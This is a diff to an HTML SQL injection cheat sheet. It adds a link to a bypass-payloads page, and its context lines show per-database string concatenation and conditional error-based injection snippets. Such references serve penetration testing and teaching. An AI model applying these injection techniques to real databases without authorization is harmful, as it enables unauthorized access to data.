@@ -1,5 +1,8 @@
 <h1>SQL Injection Cheat Sheets</h1>
 <p>This contains examples of useful syntax to perform SQL injection Attacks.</p>
+
+<a href="https://github.com/kaung-khant-zaw223/cheat-sheets/blob/main/SQL_Injection_ByPass_Payloads.md">SQL Injection Bypass Payloads</a>
+
 <h2>String Concatenation</h2>
 <p><b>Oracle      :</b> 'foo'||'bar'</p>
 <p><b>Microsoft   :</b> 'foo'+'bar'</p>
@@ -35,3 +38,4 @@
 <p><b>Microsoft:</b>SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END</p>
 <p><b>PostgreSQL:</b>SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN cast(1/0 as text) ELSE NULL END</p>
 <p><b>MySQL:</b>SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),'a')</p>
+
